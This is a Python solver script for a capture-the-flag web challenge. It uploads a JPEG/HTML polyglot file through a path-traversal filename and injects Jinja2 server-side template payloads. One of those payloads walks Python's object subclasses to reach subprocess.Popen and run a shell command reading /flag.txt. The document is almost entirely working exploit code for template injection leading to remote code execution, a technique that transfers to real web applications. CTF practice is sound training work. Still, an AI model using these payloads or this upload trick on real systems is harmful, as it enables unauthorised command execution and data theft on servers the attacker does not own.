import os
import random
from string import ascii_lowercase
import html

import requests

H4X_HEADER = b'\xff\xd8\xff\xe0\x00\x10\x4a\x46\x49\x46<html>'
H4X_SUBCLASSES = b'{{ "".__class__.__mro__[1].__subclasses__() }}'
H4X_FLAG = b'{{ "".__class__.__mro__[1].__subclasses__()[XIDXX]("cat /flag.txt", shell=True, stdout=-1, text=True).stdout.read() }}'


class Solve:

    def get_rendered(self, content):
        content = H4X_HEADER + content
        filename = ''.join(random.choices(ascii_lowercase, k=32)) + '.html'
        requests.post(
            self.base_url + 'upload',
            files={
                'file': (f'../files/{filename}', content),
            },
        ).text
        return requests.get(self.base_url + filename).content[4+len(H4X_HEADER):].decode('ascii')

    def solve_old(self):
        self.base_url = os.environ.get('CTFT_TEMPLATE_POLYGLOT_URL')
        if self.base_url[-1] != '/':
            self.base_url += '/'

        s = self.get_rendered(H4X_SUBCLASSES)
        s = html.unescape(s)
        a = s.split(',')
        idx = a.index(" <class 'subprocess.Popen'>")
        return self.get_rendered(H4X_FLAG.replace(b'XIDXX', bytes(str(idx), 'ascii')))

    def solve(self):
        self.base_url = os.environ.get('CTFT_TEMPLATE_POLYGLOT_URL')
        if self.base_url[-1] != '/':
            self.base_url += '/'
        return self.get_rendered(b"{{ flag }}")


def solve():
    return Solve().solve()


def main():
    print('\n'.join(solve()))


if __name__ == '__main__':
    main()
